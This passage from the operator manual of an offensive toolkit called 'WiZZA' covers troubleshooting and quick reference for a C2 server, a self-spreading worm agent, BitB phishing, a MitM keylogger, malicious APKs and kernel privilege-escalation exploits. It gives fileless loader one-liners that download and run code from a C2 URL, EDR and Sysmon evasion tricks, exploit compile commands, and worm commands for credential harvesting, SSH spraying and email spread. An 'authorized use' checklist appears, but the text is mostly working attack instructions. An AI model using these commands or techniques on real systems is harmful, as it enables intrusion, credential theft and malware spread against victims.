- Microsoft Defender ATP loses telemetry for that process
- Sysmon events from that process are suppressed

### Sysmon Evasion

Agents include multiple Sysmon evasion techniques:

1. **Startup jitter** — Random delay 3–18s before any activity (breaks event sequence correlation)
2. **Analyst bail-out** — Detect analysis tools (procmon, wireshark, x64dbg, ollydbg, processhacker, sysmon64) -> sleep 2 hours -> exit
3. **WMI process creation** — `win32_process.Create("cmd.exe /c ...")` hides PowerShell from EDR process tree
4. **CDN routes** — `/cdn-cgi/apps/*` traffic not flagged by network IDS rules written for `/agent/*`

---

# Troubleshooting

## C2 Server Won't Start

**Symptom:** `start payload` reports "C2 failed — check logs/c2.log"

**Check:**
```bash
# Port already in use?
ss -tlnp | grep :8888

# Kill whatever is using it:
sudo fuser -k 8888/tcp

# Check C2 log for errors:
cat ~/.wizza/logs/c2.log | tail -50

# Restart:
c2 restart
```

**Common causes:**
- Previous C2 instance still running: `pkill -f c2_server.py`
- Python import error (missing module): `python3 op/c2/c2_server.py` and check traceback
- Port 8888 blocked by firewall: `sudo ufw allow 8888`

---

## Tunnel URL Not Appearing

**Symptom:** `start payload` hangs at "Waiting for tunnel URL..."

**Check:**
```bash
cat ~/.wizza/logs/tunnel.log | tail -30
```

**Common causes:**

| Cause | Fix |
|-------|-----|
| `cloudflared` not installed | `wget <cloudflared_url> && dpkg -i cloudflared.deb` |
| Network blocked port 7844 (QUIC) | Add `protocol: http2` to `/tmp/cf_quick.yml` |
| Rate-limited by Cloudflare | Wait 5 minutes, try again |
| Corporate firewall blocks tunnel | Use `--protocol h2mux` or custom domain |

---

## Agent Not Registering

**Symptom:** Payload runs on victim but no agent appears in C2 panel

**Check on victim:**
```bash
# Python agent:
python3 worm_agent.py  # Run directly and watch output
```

**Check on operator:**
```bash
# Does C2 receive connections?
tail -f ~/.wizza/logs/c2.log | grep -i register

# Is tunnel receiving traffic?
tail -f ~/.wizza/logs/tunnel.log
```

**Common causes:**

| Cause | Fix |
|-------|-----|
| Wrong C2 URL baked | Re-run `start payload` — URL changes each session |
| Antivirus blocked execution | Use `start poly` to remutate, deliver fresh copy |
| SSL certificate error | Check `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}` in PS1 |
| Firewall blocking outbound | Try port 443 (change `C2_PORT=443` and use TLS) |
| Agent running but silent | Wait — startup jitter can delay first beacon up to 18s |

---

## Polymorphic Engine Errors

**Symptom:** `start poly ps1` produces an error

```bash
# Test directly:
python3 op/evade/poly_engine.py --lang ps1 --in test.ps1 --out test_out.ps1 --rounds 1
```

**Common causes:**

| Error | Fix |
|-------|-----|
| `ImportError: No module named 'poly_engine'` | Run from `/home/heilige/Keylogger/`: `cd /home/heilige/Keylogger` |
| `UnicodeDecodeError` | Input file may have binary content — use `--lang shellcode` for hex input |
| Empty output | Input PS1 may be empty or single-line — add a newline at end |

---

## Steganography Fails

**Symptom:** `stego.py --embed` fails or `--extract` returns wrong data

```bash
# Check Pillow is installed:
python3 -c "from PIL import Image; print('Pillow OK')"

# Install if missing:
pip install Pillow
```

**Common causes:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| `Payload X B > capacity Y B` | Image too small | Use `--auto-carrier` or provide larger carrier |
| `ValueError: Invalid length` | Extracting without correct key | Save the key from `--embed` output |
| Key mismatch | Copy-paste error in key | Key is base64 — check for truncation or spaces |
| Wrong image | Extracting from different image | Use exact image that was embedded into |

---

## Kernel Exploit Fails to Compile

**Symptom:** `gcc` errors during `start kernel exploit`

```bash
# For DirtyCow:
gcc -o dirtycow op/kernel/exploits/dirty_cow.c -pthread -ldl
# Error: pthread.h not found
sudo apt-get install libc6-dev

# For PwnKit:
# Needs separate shared library compile step
gcc -shared -fPIC -o lol.so op/kernel/exploits/pwnkit.c -DPAYLOAD_ONLY
gcc -o pwnkit_trigger op/kernel/exploits/pwnkit.c
```

**For CVE-2023-0386 (OverlayFS2 — requires FUSE):**
```bash
sudo apt-get install libfuse3-dev fuse3
gcc -o overlayfs2 op/kernel/exploits/overlayfs2.c -lfuse3 -D_FILE_OFFSET_BITS=64
```

---

## MitM Proxy Not Capturing Traffic

**Symptom:** Victim traffic not appearing in keystrokes.txt

**Check:**
```bash
# Is proxy listening?
ss -tlnp | grep :8080

# Is IP forwarding enabled?
cat /proc/sys/net/ipv4/ip_forward   # Should be 1

# Are iptables rules active?
sudo iptables -t nat -L PREROUTING -n -v
# Should show REDIRECT rules for :80 and :443

# ARP poison status?
ps aux | grep arpspoof
```

**HTTPS issue:** Even with the proxy active, HTTPS traffic shows as encrypted if victim hasn't installed the WiZZA CA cert. Without the iOS MDM profile (or manually trusting the cert), browser HTTPS is intercepted but shows certificate warning to victim. Most modern browsers will block this.

---

## Mobile APK Not Installing

**Common causes:**

| Cause | Fix |
|-------|-----|
| `Unknown sources` disabled | Victim must enable: Settings -> Security -> Unknown Sources |
| Play Protect blocking | Victim: Play Store -> Menu -> Play Protect -> Turn off (if possible) |
| APK not signed | Rebuild with debug signing key: `jarsigner -keystore debug.keystore` |
| msfvenom not installed | `sudo apt-get install metasploit-framework` |

---

## Common Error Messages

| Error | Meaning | Fix |
|-------|---------|-----|
| `Address already in use` | Port busy | `fuser -k <port>/tcp` |
| `No route to host` | Network not reachable | Check victim's network connectivity |
| `SSL: CERTIFICATE_VERIFY_FAILED` | TLS cert not trusted | Add `verify=False` or install CA cert |
| `Permission denied` | Running without root | `sudo start <command>` |
| `cloudflared: command not found` | cloudflared not installed | Install from Cloudflare GitHub |
| `Pillow: ImportError` | PIL not installed | `pip install Pillow` |
| `msfvenom: command not found` | Metasploit not installed | Use NASM or PS1 fallback |
| `bash: syntax error` | Shell script error | Run `bash -n start` to identify line |

\newpage

# Quick Reference Card

## Essential Commands

```bash
# Start everything (interactive wizard)
start

# BitB phishing
start up

# MitM keylogger
start mitm

# C2 + agent deployment
start payload

# Watch credentials live
start creds

# Kill everything
start down

# Status check
start status
```

## Payload Delivery One-Liners

```powershell
# Windows — PowerShell fileless load:
powershell -w h -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('$C2URL/download/stage1.ps1'))"

# Windows — Run HTA directly:
mshta.exe "$C2URL/download/SecureCertUpdate.hta"
```

```bash
# Linux/Mac — Python fileless load:
curl -s "$C2URL/download/stage1.py" | python3

# Linux/Mac — With SSL bypass:
python3 -c "import urllib.request,ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; exec(urllib.request.urlopen(urllib.request.Request('$C2URL/download/stage1.py'),context=ctx).read())"
```

## Shellcode Quick Reference

```bash
# Generate (msfvenom)
python3 op/payloads/shellcode/gen_shellcode.py --lhost 10.0.0.1 --lport 4444 --format hex

# Poly-wrap shellcode
start poly shell

# Generate + poly-wrap + deliver
start shellcode gen     # -> hex
start shellcode poly    # -> PS1 runner
```

## Poly Engine Quick Reference

```bash
start poly ps1          # Mutate a PS1 file
start poly py           # Mutate a Python file
start poly all          # Mutate all payloads
start poly shell        # Wrap shellcode hex
start poly watch        # Auto-remutate on schedule
```

## Kernel Exploit Quick Reference

```bash
start kernel check      # Scan for vulns
start kernel exploit    # Interactive compile + deploy

# Manual compile (from op/kernel/exploits/):
gcc -o dirtycow dirty_cow.c -pthread -ldl        # CVE-2016-5195
gcc -o dirtypipe dirty_pipe.c                    # CVE-2022-0847
gcc -o pwnkit_trigger pwnkit.c && \
  gcc -shared -fPIC -o lol.so pwnkit.c -DPAYLOAD_ONLY  # CVE-2021-4034
```

## Port Reference

| Port | Service |
|------|---------|
| :8888 | C2 server (HTTP/HTTPS + web panel) |
| :8082 | BitB phishing catcher |
| :8080 | MitM proxy (mitmproxy) |
| :8083 | MitM reverse proxy tunnel |
| :9999 | Keystroke catcher |
| :4444 | Default shellcode listener (msfvenom) |

## File Locations

| File | Purpose |
|------|---------|
| `~/.wizza_config` | Persistent settings |
| `~/.wizza/logs/credentials.txt` | All captured credentials |
| `~/.wizza/logs/keystrokes.txt` | MitM keylogger output |
| `~/.wizza/logs/c2.log` | C2 server log |
| `~/.wizza/payloads/` | Baked payload files |
| `~/.wizza/logs/loot/` | Screenshots, webcam frames, exfil |

\newpage

# Appendices

## Appendix A — Kernel CVE Summary

| CVE | Common Name | Affected Versions | CVSS | Reliability |
|-----|------------|-------------------|------|-------------|
| CVE-2016-5195 | DirtyCow | Linux 2.6.22–4.8.3 | 7.8 | High |
| CVE-2022-0847 | DirtyPipe | Linux 5.8–5.16.11 | 7.8 | High |
| CVE-2021-3493 | OverlayFS | Ubuntu 5.0–5.10 | 7.8 | High (Ubuntu) |
| CVE-2023-0386 | OverlayFS FUSE | Linux 5.11–6.2 | 7.8 | Medium |
| CVE-2021-4034 | PwnKit | All (polkit < 0.120) | 7.8 | High |
| CVE-2024-1086 | nftables UAF | Linux 5.14–6.6 | 7.8 | Medium |
| CVE-2021-22555 | Netfilter OOB | Linux 2.6.19–5.12 | 7.8 | Medium |
| CVE-2022-2588 | cls_route UAF | Linux 4.9–5.18 | 7.8 | Medium |

## Appendix B — Agent Command Summary

**Recon:** `RECON`, `SYSINFO`, `NETWORK`, `DRIVES`

**Capture:** `SCREENSHOT`, `WEBCAM`, `CLIPBOARD`, `KEYLOG_START`, `KEYLOG_DUMP`

**Harvest:** `BROWSERS`, `HASHDUMP`, `SSHKEYS`, `EXFIL`, `GETFILE <path>`

**Post-Exploit:** `PERSIST`, `PRIVESC`, `CLEAN`, `SELFDESTRUCT`

**Spread:** `NET_SCAN`, `SSH_TARGETS`, `SSH_SPRAY`, `SMB_SCAN`, `GIT_POISON`, `EMAIL_SPREAD`, `DOCKER_ESCAPE`

**Worm Control:** `WORM_STATUS`, `WORM_PAUSE`, `WORM_RESUME`, `WORM_SPREAD_NOW`, `WORM_SET_C2 <url>`, `WORM_SKIP <host>`, `WORM_USB_ON/OFF`, `WORM_SSH_ON/OFF`, `WORM_SET_INTERVAL <n>`

**Windows:** `INJECT <b64_shellcode>`, `RUN_PS <code>`

**Shell:** any other text -> treated as shell command and executed via `cmd.exe /c` (Windows) or `bash -c` (Linux)

## Appendix C — Dependencies Summary

| Dependency | Install | Required For |
|-----------|---------|-------------|
| Python 3.8+ | system | Everything |
| `cloudflared` | GitHub | All remote attacks |
| `mitmproxy` | `pip install mitmproxy` | MitM module |
| `Pillow` | `pip install Pillow` | Steganography |
| `msfvenom` | Kali built-in | Shellcode, Android APK |
| `nasm` | `apt install nasm` | Fallback shellcode |
| `arpspoof` | `apt install dsniff` | Physical LAN attacks |
| `bettercap` | `apt install bettercap` | DNS spoof (physical) |
| `openssl` | system | Certificate generation |
| `gcc` | system | Kernel exploit compilation |

## Appendix D — Engagement Checklist

**Pre-engagement:**
- [ ] Written authorization obtained
- [ ] Scope of testing defined and documented
- [ ] Emergency contact established
- [ ] Backup C2 URL configured (CF_DOMAIN)

**Setup:**
- [ ] `bash start install` run
- [ ] `start domain` configured (optional)
- [ ] All dependencies installed (`pip install mitmproxy Pillow`)
- [ ] `start status` shows clean state

**Pre-deployment:**
- [ ] `start poly all` — remutate all payloads
- [ ] `start untrack` — pass stealth audit
- [ ] `start shellcode gen` — fresh shellcode generated
- [ ] C2 URL baked into all payloads

**During engagement:**
- [ ] `start creds` running in separate terminal
- [ ] C2 panel open at `https://localhost:8888/panel`
- [ ] `start logs` running for anomaly detection

**Post-engagement:**
- [ ] Send `CLEAN` to all agents
- [ ] Send `SELFDESTRUCT` to all agents
- [ ] `start down` to stop all local processes
- [ ] Remove any dropped files from targets
- [ ] Archive logs for report

## Appendix E — Glossary

| Term | Meaning |
|------|---------|
| **Agent** | Persistent backdoor running on compromised host |
| **Worm** | Self-propagating agent with multiple spread vectors |
| **Stage1** | Tiny first-stage loader that downloads the full agent |
| **Stager** | Another term for Stage1 |
| **BitB** | Browser-in-the-Browser — fake login popup overlay |
| **MitM** | Man-in-the-Middle — intercept and relay network traffic |
| **AMSI** | Antimalware Scan Interface — Windows AV hook |
| **ETW** | Event Tracing for Windows — telemetry for Defender |
| **CFG** | Control Flow Guard / Control Flow Graph |
| **ROR-13** | Rotate-right-13 hash algorithm (API resolution in shellcode) |
| **PEB** | Process Environment Block — Windows data structure holding loaded DLLs |
| **LSB** | Least Significant Bit — used in steganography |
| **DoH** | DNS over HTTPS — encrypted DNS (used for C2 fallback) |
| **LPE** | Local Privilege Escalation |
| **LKM** | Loadable Kernel Module — rootkit insertion method |
| **MDM** | Mobile Device Management — used for iOS CA cert install |
| **IoC** | Indicator of Compromise — artifacts that reveal malicious activity |
| **Fileless** | Payload executes in memory, never touches disk |
| **Timestomp** | Modify file timestamps to match legitimate system files |
| **CDN** | Content Delivery Network — WiZZA mimics Cloudflare CDN |
| **Polymorphic** | Code that changes its appearance while keeping functionality |
| **UAF** | Use-After-Free — kernel memory corruption class |
| **OOB** | Out-Of-Bounds — memory access past buffer boundary |
---

*WiZZA Penetration Testing Toolkit — Authorized Use Only*
